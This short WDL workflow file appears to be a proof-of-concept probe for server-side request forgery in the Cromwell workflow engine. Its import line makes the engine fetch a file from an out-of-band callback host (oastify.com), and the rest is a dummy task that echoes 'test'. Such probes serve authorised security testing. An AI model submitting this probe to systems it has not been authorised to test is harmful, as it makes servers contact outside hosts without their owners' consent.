version 1.0

import "http://ds9rdv88z8t9xz5j4fqhflnsyj4as3gs.oastify.com/cromwell-import-ssrf.wdl" as ssrf_test

workflow WDLImportSSRF {
    call Dummy
}

task Dummy {
    command <<<
        echo "test"
    >>>
    output { String result = read_string(stdout()) }
    runtime { docker: "gcr.io/google.com/cloudsdktool/cloud-sdk:461.0.0-alpine" }
}
